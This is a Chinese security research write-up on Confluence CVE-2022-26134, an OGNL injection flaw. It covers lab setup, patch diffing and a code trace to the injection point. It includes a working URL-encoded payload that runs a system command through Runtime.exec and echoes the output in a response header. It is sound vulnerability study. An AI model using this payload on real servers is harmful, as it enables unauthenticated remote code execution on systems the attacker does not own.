0x00 前言
=======

 基于Java两种常见高危害漏洞: 反序列化和表达式注入, 最新爆出来的Confluence RCE漏洞就是OGNL注入,值得注意的是,这个漏洞利用难度低,影响范围广泛,非常有学习的价值。本文详细分享了笔者的学习该漏洞过程的技巧、问题以及一些思考。

0x01 漏洞复现
=========

使用P牛的VulHub搭建漏洞环境

```bash
# 1.下载docker-compose.yml
wget --no-check-certificate  https://ghproxy.com/https://raw.githubusercontent.com/vulhub/vulhub/master/confluence/CVE-2022-26134/docker-compose.yml
# 2.运行
docker-compose up -d
```

如果使用docker-compose v2.6.0, 报如下错误需要修改下`docker-compose.yml`文件。

> Error response from daemon: Invalid container name (-db-1), only \[a-zA-Z0-9\]\[a-zA-Z0-9\_.-\] are allowed

```yaml
version: '2'
services:
  web:
    container_name: web
    image: vulhub/confluence:7.13.6
    ports:
      - "8090:8090"
      - "5050:5050" # 调试端口
    depends_on:
      - db
  db:
    image: postgres:12.8-alpine
    container_name: db
    environment:
    - POSTGRES_PASSWORD=postgres
    - POSTGRES_DB=confluence
```

运行起来后，访问:<http://localhost:8090/setup/setuplicense.action>

![image-20220604233016028.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-395a19d12e723bd04145df81b0e23ca07bba94e3.png)  
直接使用gmail邮箱进行注册申请，选择DataCenter，按照提示，一路生成License填入Next，然后配置数据库，地址是: `db`, 账号密码的都是`postgres`,这一步有点久有点卡，稍微等一下。

![image-20220604233003910.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3b9f8073eecc221cd4b597d4440cc8f6f86fd768.png)

上一步成功后，会跳出来一个初始化页面，选择Example Site，然后一路配置就行。

![image-20220604233443879.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-84fd0e05b7666aa88a26dec8720080d0f3c79ee1.png)

![image-20220604233456142.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a1167af3ec698b8b7d8dc0b20c20da83fc129bd5.png)

payload:

```php
http://localhost:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```

payload解码后,可以发现其实就是OGNL注入漏洞。

![image-20220604234316100.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e8618308cd87b0844049eeffbcff662329749312.png)

命令回显:  
![image-20220604234138843.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ab5c06539846ef368b9757ca62b2e4bb1d3c2ef7.png)

0x02 调试环境
=========

访问:<https://www.atlassian.com/software/confluence/download-archives>

![image-20220604164608948.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d8cc1234cff7bba092d05e8bf1c02bd4aa81c174.png)

对应上P牛的版本，点击Download,IDEA新建一个项目，用`confluence`作为根目录。

![image-20220605002219401.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f2206bc0ebb717c62f7cd44c04fb5970d84bf497.png)  
将`web-INF`下`atlassian-bundled-plugins`、`atlassian-bundled-plugins-setup`和`lib`都添加到项目的依赖。

![image-20220605002643765.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-016c8212cb86edced6e285bb83d91c02771d4dab.png)

配置远程调试:

 进入容器`docker exec -it b8d9d3517126 bash`,查看java版本

```php
root@74ee415c25e2:/var/atlassian/application-data/confluence# /opt/java/openjdk/bin/java --version
openjdk 11.0.15 2022-04-19
OpenJDK Runtime Environment Temurin-11.0.15+10 (build 11.0.15+10)
OpenJDK 64-Bit Server VM Temurin-11.0.15+10 (build 11.0.15+10, mixed mode)
```

添加tomcat debug配置:

 根据`env`或者入口文件,找到安装路径:`cd /opt/atlassian/confluence/bin`

```php
sed -i '/export CATALINA_OPTS/iCATALINA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050 ${CATALINA_OPTS}"' setenv.sh
```

设置完毕后,重启容器`docker restart 74ee415c25e2`,回到IDEA按照如下,配置远程调试。

![image-20220605103505751.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-145276754ce9b7f544fac9e032000baff4e6faee.png)

然后开始调试即可。

![image-20220605104258867.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d86ec75459c9199df3c61078e3d596a5e5212136.png)

0x03 补丁分析
=========

Atlassian的漏洞官方公告:

<https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html>

结合漏洞修复的信息,可以看到,不同版本补丁都需要替换一个共同的jar包:**xwork-1.0.3-atlassian-8.jar**

那么很明显漏洞的关键点就在于这个jar包,简单进行对比

补丁包:xwork-1.0.3-atlassian-10.jar

<https://packages.atlassian.com/maven-internal/opensymphony/xwork/1.0.3-atlassian-10/xwork-1.0.3-atlassian-10.jar>

7.13.6对应的漏洞包:xwork-1.0.3.6.jar

<https://packages.atlassian.com/maven-internal/opensymphony/xwork/1.0.3.6/xwork-1.0.3.6.jar>

为了减少干扰,还可以引入最新的漏洞包: xwork-1.0.3-atlassian-8.jar

<https://packages.atlassian.com/maven-internal/opensymphony/xwork/1.0.3-atlassian-8/xwork-1.0.3-atlassian-8.jar>

为了让代码更好看,官方还提供了源码包,直接添加漏洞包的jar为Library,然后右键选择`compare with`比较补丁包

![image-20220605150253449.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5138dbf896e5b385218aa5e6431d0e382c7edb53.png)

![image-20220605150523380.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8ce7309c816eff95fdb2312445167ff98e3e2438.png)

可以看到,只有一处修改的地方`ActionChainResult`类的`execute`方法,那么问题是非常清晰的了,如果之前有研究过Confluence的searcher,估计一下子就能写出POC。

0x04 漏洞分析
=========

​ 因为笔者之前对Confluence了解并不多,所以还需要进行一些分析,作为一个合格"researcher",应该是能够通过尝试构造出payload。

```java
OgnlValueStack stack = ActionContext.getContext().getValueStack();
String finalNamespace = TextParseUtil.translateVariables(namespace, stack);
String finalActionName = TextParseUtil.translateVariables(actionName, stack);
```

那么可以简单跟进去`translateVariables`

![image-20220605152059287.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f297150be977c6c91819b535e49fa88f073ec88b.png)

提取符合`\\$\\{([^}]*)\\}`正则的括号内容`group(1)`,然后传到`Object o = stack.findValue(g);`

![image-20220605152617301-4413977.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bde9be716d3343de678b3aaf1d16b7ad6db02108.png)

可以看到最终都会走进解析OGNL表达式的流程,下一步,我们就是需要知道这个函数参数值该怎么控制,并且在执行的过程中是否能够保持值没被过滤。

下一个断点,并且访问尝试`/index.acion`,看看能不能走进到漏洞流程。

![image-20220605163854766.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e8ac98b30185a96e73af2ac512bf256c9b8a722d.png)

可以看到,漏洞点没有看到明显可控的值,那么可以尝试回溯,通过函数调用栈来看看相关值的传递过程是否可控。

思路是这样的:

分析核心函数栈

```php
execute:96, ActionChainResult (com.opensymphony.xwork)
executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)
invoke:187, DefaultActionInvocation (com.opensymphony.xwork)
intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:27, LastModifiedInterceptor (com.atlassian.confluence.core.actions)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:44, ConfluenceAutowireInterceptor (com.atlassian.confluence.core)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
invokeAndHandleExceptions:61, TransactionalInvocation (com.atlassian.xwork.interceptors)
invokeInTransaction:51, TransactionalInvocation (com.atlassian.xwork.interceptors)
intercept:50, XWorkTransactionInterceptor (com.atlassian.xwork.interceptors)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:61, SetupIncompleteInterceptor (com.atlassian.confluence.xwork)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:26, SecurityHeadersInterceptor (com.atlassian.confluence.security.interceptors)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor)
invoke:165, DefaultActionInvocation (com.opensymphony.xwork)
execute:115, DefaultActionProxy (com.opensymphony.xwork)
serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)
service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)
service:764, HttpServlet (javax.servlet.http)
....
```

漏洞需要使用的值分别是:`ActionChainResult`类的`this.namespace` 或者 `this.actionName`,该类实例由`createResults`方法创建,向上追溯`createResult`方法 对应的是在`DefaultActionInvocation`类。

```java
    private void executeResult() throws Exception {
        // 实例ActionChainResult对象,跟进
        this.result = this.createResult();
        if (this.result != null) {
            this.result.execute(this);
        } else if (!"none".equals(this.resultCode)) {
            LOG.warn("No result defined for action " + this.getAction().getClass().getName() + " and result " + this.getResultCode());
        }

    }
```

```java
    public Result createResult() throws Exception {
        Map results = this.proxy.getConfig().getResults();
        ResultConfig resultConfig = (ResultConfig)results.get(this.resultCode);
        Result newResult = null;
        if (resultConfig != null) {
            try {
              //  返回值, 跟进去buildResult方法
              // 其实就是一一对应resultConfig类属性进行赋值.
                newResult = ObjectFactory.getObjectFactory().buildResult(resultConfig);
            } catch (Exception var5) {
                LOG.error("There was an exception while instantiating the result of type " + resultConfig.getClassName(), var5);
                throw var5;
            }
        }

        return newResult;
    }
```

返回值是`newResult` &lt;&lt; `resultConfig` &lt;&lt; `this.proxy.getConfig().getResults().;`的`get(this.resultCode)`

到了这一步,我们的回溯对象就需要切换回`this.proxy.getConfig().getResults()`

![image-20220605170313301.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a9a89690af23be6202e59a6a53a825d2549cf291.png)

根据代理设计模式,可以直接跳过invoke的调用过程,直接在调用栈找到`DefaultActionProxy`类进行分析就好。

![image-20220605172330997.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b37b8a7963d8be4c0dfe233fd18c30f6cf1eb1e.png)

```java
    public ActionConfig getConfig() {
        return this.config;
    }
```

![image-20220605172657087.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-db3ef08a714940e990f54c338320174cccf477cb.png)

可以看到`this.config`的值其实是由`DefaultActionProxy`这个代理类的构造函数参数(`namespace`和`actioname`)来创建的。

可以跟进`getActionConfig`这个接口实现,其中返回的config对象来源于`this.namespaceActionConfigs`

```java
        public synchronized ActionConfig getActionConfig(String namespace, String name) {
            ActionConfig config = null;
            Map actions = (Map)this.namespaceActionConfigs.get(namespace == null ? "" : namespace);
            if (actions != null) {
                config = (ActionConfig)actions.get(name);
            }

            if (config == null && namespace != null && !namespace.trim().equals("")) {
                actions = (Map)this.namespaceActionConfigs.get("");
                if (actions != null) {
                    config = (ActionConfig)actions.get(name);
                }
            }

            return config;
        }
```

而`this.namespaceActionConfigs`的初始化值,是通过扫描系统的配置得到(并且会重新reload一次),也就是说它的值始终是默认的,正常来说没办法控制。

![image-20220605194938316.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-98c0f7d3c3f83d1a6bb2ca6a08d95589656fc83e.png)

当我们传入`/index.action`的时候,漏洞核心触发点在于控制 `ActionChainResult`类实例的`this.namespace` 或者 `this.actionName`,也就是下图中返回的`newResult`。

![image-20220605200044200.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6bef1d78284e42fde13df7b74da0ad9c610f4b92.png)

那么`newResult`的值从哪里来的呢? 结合前面的分析,来自`this.namespaceActionConfigs`(系统默认有的ActionConfig) 其中的`IndexAction`Config 对应的`results`中键为`notpermitted`的对应的value,即`com.opensymphony.xwork.ActionChainResult`类实例

![image-20220605200448768.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-513430224940a34d5f30291b72f7906a1e338014.png)

最终我们得到一个不可控的`ActionChainResult`的具有默认类属性的实例,如下图所示

![image-20220605200843253.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2e2d100f4a97dec030da5c55d9955dd05d2a3a87.png)

继续向下执行`execute`,即将进入到漏洞触发点的时候,有一个非常关键的地方,就是对`this.namespace`有一个赋值的操作,其中的`invocation`,其实就是方法参数传入的`DefaultActionInvocation`的`this`本身。

![image-20220605201127728.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3d749dc8b15c8429f93b8ede8065864d8021c40f.png)

经过`invocation.getProxy()`,其实获取的就是`DefaultActionProxy`代理类,``invocation.getProxy().getNameSpace()`也就是获取这个代理类的`namespace`属性值。

而`DefaultActionProxy`这个代理类的对应的`namespace`和`actioname`属性值的来源(来自`request.getServletPath()`)如图所示:

![image-20220605180719657.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f68cc123ba3c339c7abe0a1d32187b8f4e45198d.png)

那么我们只需要分别跟进`com/opensymphony/webwork/dispatcher/ServletDispatcher.class` 的`getNameSpace`和`getActionName`方法就行。

**getActionName**: 解析`request.getServletPath()`,匹配最后一个`/`和最后一个`.`中间的字符串作为action,如果找不到`/`或者`.`就后续整个path作为action。

```java
    protected String getActionName(HttpServletRequest request) {
        String servletPath = (String)request.getAttribute("javax.servlet.include.servlet_path");
        if (servletPath == null) {
            servletPath = request.getServletPath();
        }

        return this.getActionName(servletPath);
    }

    protected String getActionName(String name) {
        int beginIdx = name.lastIndexOf("/");
        int endIdx = name.lastIndexOf(".");
        return name.substring(beginIdx == -1 ? 0 : beginIdx + 1, endIdx == -1 ? name.length() : endIdx);
    }
```

**getNameSpace**: 同样是解析`request.getServletPath()`,不过是获取最后`/`之前字符串作为`NameSpace`

```java
    protected String getNameSpace(HttpServletRequest request) {
        String servletPath = request.getServletPath();
        return getNamespaceFromServletPath(servletPath);
    }
    public static String getNamespaceFromServletPath(String servletPath) {
            servletPath = servletPath.substring(0, servletPath.lastIndexOf("/"));
            return servletPath;
        }
```

0x05 构造POC
==========

基于上面的分析, 很容易就可以构造出一个简单的验证POC:

`http://localhost:8090/${3-1}/index.action`

但是直接传入的话,因为tomcat的原因,特殊字符违反RFC,会导致400,所以需要进行编码:  
`http://localhost:8090/%24%7b3-1%7d/index.action`

![image-20220605202415901.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4216991319d4322c1489024018e2cc59a20473bd.png)

最终传入到OGNL解析表达式`getValue`进行计算得到结果。

![image-20220605202528160.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-469c47e17842134aee8df0fd8995c7bba6f6fdb0.png)

0x06 分析小结
=========

​ 上面的分析思路,其实有一定的运气成分在里面,因为是直接通过访问一个`index.action`刚好能够触发到漏洞点,所以少了找触发点时间。所以这个漏洞一旦发出补丁包,就很容易被别人迅速diff定位出来问题成因并完成POC验证,下面分享一些自己可以再深入研究的一些Points。

**1.后续挖掘方向**

根据前文的分析,可知我们必须要执行`ActionChainResult`的`execute`方法里面`TextParseUtil.translateVariables`方法。

那么后续的漏洞挖掘方向,因为补丁修复了`execute`是直接删掉`TextParseUtil.translateVariables`,我们可以继续找找看什么地方可控调用这个方法的。

![image-20220605203809019.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9c77940d839a5ab5d60724491caf7f116711d8e9.png)

**2.什么情况不会触发漏洞**

漏洞的关键在于执行到`ActionChainResult`的`execute`方法

请求分发从tomcat交给confluence的时候是从`ConfluenceServletDispatcher.class`的`serviceAction`方法开始的,然后根据`action`,遍历`interceptors`列表,比如`index.action`就有28个拦截器,在加载`index.action`之前需要进行判断

![image-20220605230112183.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7dc6d54cb5dbc665a1b17ff2914d7d37b4b3fcae.png)

其中有一个拦截器是比较关键的:`ConfluenceAccessInterceptor`

![image-20220605230942958.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-54236054cab5ed85919d16b292f4b26574b97ddf.png)

```java
public String intercept(ActionInvocation actionInvocation) throws Exception {
  return ContainerManager.isContainerSetup() &&         !this.isAccessPermitted(actionInvocation) ? "notpermitted" :    actionInvocation.invoke();
}
```

![image-20220605231421851.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f061f8f130865ee979eaff491f3aac43599af36f.png)

这个`intercept`函数因为我们登陆的用户没有权限访问,所以返回`notpermitted`,这样的话就可以避免像其他拦截器最终还是会执行`actionInvocation.invoke()`从而陷入迭代的循环,而是跳出循环继续向下执行到漏洞触发(因为你都没权限访问,后面其他拦截器处理可能就是没有意义的了)

接着还是要向下走的是不是,那么继续需要需要构造一个Response处理没权限访问的情况,于是构造了一个`ActionChainResult`的实例

![image-20220605231849748.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-42e5b0333966fd835c3977ebdec9e277ff6d1ec6.png)

这个返回的实例对象也很有意思,竟然里面的`execute`有个看起来跟后门一样的OGNL的注入点(真的看起来像后门,我是瞎说的,也有可能是struts历史遗留问题呢,某知是什么情况...)

```java
// 这个确实多余的,要不然patch的时候,就不会直接删掉这个方法,用到这个方法就是RCE
TextParseUtil.translateVariables(this.namespace, stack);
```

漏洞执行完后, 将FinalAction和FinalNameSpace添加到历史纪录后(ActionChainResult的这个类目的估计就是做这个),进入到`notpermitted`Action的逻辑,又重复一次上面的循环迭代拦截器的过程中

![image-20220605234546518.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b37f63578e5052016718c09808d3f1e686856e72.png)

最终迭代无果之后,返回"login"

![image-20220605235937818.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1550148e2343f6c893ad3a4ec123144627e10c7b.png)

这里的OGNL使用就比较合理,因为不可控`${loginUrl}`,初始化的值为`NULL`,如果找到一些地方控制它也是可以rce

![image-20220606000310688.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-11607c6310dacb489c3e938ce768b940ae696045.png)

所以说这个漏洞不是随便都可以触发的,不同action不同权限的未必能走到`ActionChainResult`实例的`execute`漏洞方法中。

0x07 后续
=======

 本文主要分享漏洞成因及其原理,至于后续打算从OGNL这个点入手,因为Confluence有很多版本,在某些高版本存在OGNL沙箱对payload进行过滤,绕过沙箱的过程也比较有趣,是一个不错的深入学习OGNL漏洞利用机会,期待与读者一起分享这个过程。

0x08 参考链接
=========

[Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)

[JAVA表达式注入漏洞 ](https://www.cnblogs.com/zzhoo/p/15401278.html)

[CentOS8 docker搭建confluence7.12.4调试环境](https://www.youncyb.cn/?p=717)